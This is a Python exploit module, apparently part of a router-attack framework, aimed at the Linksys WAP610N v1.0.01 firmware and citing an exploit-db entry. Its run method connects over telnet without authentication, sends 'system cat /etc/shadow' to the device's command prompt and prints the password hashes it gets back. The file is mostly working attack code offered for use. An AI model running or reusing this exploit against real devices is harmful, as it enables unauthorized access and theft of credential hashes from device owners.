import telnetlib
import util
from ..router_vuln import RouterVuln

class wap610n_dump(RouterVuln):
	"""Unauthenticated root access over telnet
	   http://www.exploit-db.com/exploits/16149/
	"""
	
	def __init__(self):
		self.router = 'WAP610N v1.0.01'
		self.vuln   = 'Unauthenticated File Disclosure'
		super(wap610n_dump,self).__init__()

	def run(self):
		util.Msg('Retrieving shadow...')
		try:
			tn = telnetlib.Telnet(self.ip)
			tn.read_until('Command> ')
			tn.write('system cat /etc/shadow\n')
			data = tn.read_all()
			tn.write('exit\n')
		except Exception, e:
			util.Error("Error: %s"%e)
			return
		print data
